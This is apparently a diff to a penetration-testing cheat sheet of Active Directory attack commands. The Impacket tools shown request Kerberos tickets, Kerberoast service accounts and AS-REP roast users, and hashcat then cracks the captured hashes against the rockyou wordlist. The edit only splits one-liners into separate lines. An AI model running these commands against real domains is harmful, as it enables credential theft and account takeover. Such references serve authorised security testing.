@@ -3,27 +3,32 @@
 
 ## GetTGT
 ```
-getTGT.py <domain>/'<user>'<impacket_auth>;export KRB5CCNAME=$(pwd)/'<user>'.ccache
+getTGT.py <domain>/'<user>'<impacket_auth>
+export KRB5CCNAME=$(pwd)/'<user>'.ccache
 ```
 
 ## Kerberoast
 ```
-GetUserSPNs.py -request -outputfile hashes.kerberoast <domain>/'<user>'<impacket_auth>; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
+GetUserSPNs.py -request -outputfile hashes.kerberoast <domain>/'<user>'<impacket_auth>
+hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
 ## Kerberoast with no-preauth user
 ```
-GetUserSPNs.py -request -no-preauth <no-preauth_user> -usersfile <usersfile|users.txt> -outputfile hashes.kerberoast <domain>/; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
+GetUserSPNs.py -request -no-preauth <no-preauth_user> -usersfile <usersfile|users.txt> -outputfile hashes.kerberoast <domain>/
+hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
 ```
 
 ## ASREPRoast with usersfile
 ```
-GetNPUsers.py -usersfile <usersfile|users.txt> -outputfile hashes.asreproast <domain>/;hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
+GetNPUsers.py -usersfile <usersfile|users.txt> -outputfile hashes.asreproast <domain>/
+hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 ```
 
 ## ASREPRoast with authentication
 ```
-GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>'<impacket_auth>;hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
+GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>'<impacket_auth>
+hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
 ```
 
 ## KCD/RBCD (principal requires SPN!)
